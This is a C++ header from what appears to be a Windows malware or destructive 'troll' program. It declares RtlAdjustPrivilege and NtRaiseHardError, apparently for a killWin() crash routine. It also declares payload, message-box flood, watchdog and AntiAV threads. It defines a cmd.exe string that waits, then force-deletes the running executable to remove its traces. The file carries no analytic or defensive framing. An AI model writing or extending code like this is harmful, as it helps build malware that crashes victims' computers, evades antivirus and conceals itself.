#pragma once
#include <Windows.h>
#include <ctime>
#include <stdio.h>
#include <TlHelp32.h>
#include <Shlwapi.h>
#include <Psapi.h>
#include <CommCtrl.h>
#include <ShlObj.h>
#include <winternl.h>
#include <strsafe.h>
#include <cstdio>
#include <tchar.h>
#include <winreg.h>

#include "data.h"
#include "resource.h"

#pragma warning(disable: 4996)

#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "ntdll.lib")

extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrThread, PBOOLEAN StatusPointer);
extern "C" NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG Unless1, ULONG Unless2, PULONG_PTR Unless3, ULONG ValidResponseOption, PULONG ResponsePointer);

EXTERN_C IMAGE_DOS_HEADER __ImageBase;

#define SELF_REMOVE_STRING  TEXT("cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del /f /q \"%s\"")

void killWin();
int random();
LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam);
bool FindProcess(const wchar_t* processName);

DWORD WINAPI payloadThread(LPVOID parameter);
DWORD WINAPI TrollThread(LPVOID parameter);
DWORD WINAPI soundThread(LPVOID parameter);
DWORD WINAPI GameActivity(LPVOID parameter);
DWORD WINAPI messageWave(LPVOID parameter);
DWORD WINAPI messageBoxThread(LPVOID parameter);

LRESULT CALLBACK WindowProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
DWORD WINAPI watchdog(LPVOID parameter);
DWORD WINAPI AntiAV(LPVOID parameter);

DWORD WINAPI visualfx(LPVOID parameter);
DWORD WINAPI execute(LPVOID parameter);

extern int w, h;